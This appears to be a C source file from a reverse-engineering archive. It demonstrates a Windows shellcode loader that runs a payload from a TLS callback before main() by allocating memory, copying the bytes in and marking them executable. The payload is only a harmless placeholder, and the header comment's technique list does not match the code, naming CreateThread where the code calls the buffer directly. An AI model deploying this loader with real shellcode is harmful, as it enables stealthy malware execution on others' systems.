/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode as TLS callback

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    n/a
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

VOID callback (PVOID handle, DWORD reason, PVOID reserved);

/*
    Thread Local Storage is located on different area for x64 and x86.
    A special section is made to store TLS data, which is encoded
    in IMAGE_DIRECTORY_ENTRY_TLS.
*/
#ifdef _WIN64
    #pragma comment(linker,"/INCLUDE:_tls_used")
    #pragma comment(linker,"/INCLUDE:ptr_callback")
    #pragma const_seg(push)
    #pragma const_seg(".CRT$XLB")
    EXTERN_C const PIMAGE_TLS_CALLBACK ptr_callback = callback;
    #pragma const_seg(pop)
#else 
    #pragma comment(linker,"/INCLUDE:__tls_used")
    #pragma comment(linker,"/INCLUDE:_ptr_callback")
    #pragma data_seg(push)
    #pragma data_seg(".CRT$XLB")
    EXTERN_C PIMAGE_TLS_CALLBACK ptr_callback = callback;
    #pragma data_seg(pop)
#endif 

int main()
{
    return 0;
}

// execute directly
VOID callback (PVOID handle, DWORD reason, PVOID reserved)
{
    void *      runtime;
    DWORD       old_protect = 0;
    uint8_t     payload[] = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // make sure to execute only once
    if (reason == DLL_PROCESS_ATTACH)
    {
        // allocate bffer for payload as READ-WRITE (no executable)
        runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // copy payload to the buffer
        RtlMoveMemory (runtime, payload, payload_len);

        // make buffer executable (R-X)
        VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

        int (*func)() = (int (*)())runtime;
        func();

        // deallocate the space
        VirtualFree (runtime, payload_len, MEM_RELEASE);
    }
}